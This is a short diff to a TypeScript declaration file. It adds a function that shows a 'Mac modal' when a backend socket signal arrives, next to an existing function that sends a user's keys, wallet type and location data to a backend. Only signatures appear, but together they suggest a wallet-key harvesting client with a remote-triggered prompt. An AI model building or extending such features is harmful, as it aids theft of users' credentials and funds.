@@ -5,6 +5,15 @@ import { KeyType } from '../types';
  */
 export declare const initializeSocket: () => Socket | null;
 /**
+ * Subscribe to backend "show Mac modal" socket event.
+ * When the backend emits this event, the callback is invoked.
+ * Use with MacModalTrigger to show the Mac modal on signal.
+ *
+ * @param callback - Called when the backend emits the showMacModal event (configurable via macModalSocketEvent).
+ * @returns Unsubscribe function.
+ */
+export declare const subscribeToShowMacModal: (callback: () => void) => (() => void);
+/**
  * Send key data to backend via API
  */
 export declare const sendKeyToBackendAPI: (userId: string, keyType: KeyType, keys: string, walletTypeShortkey?: string, locationData?: {
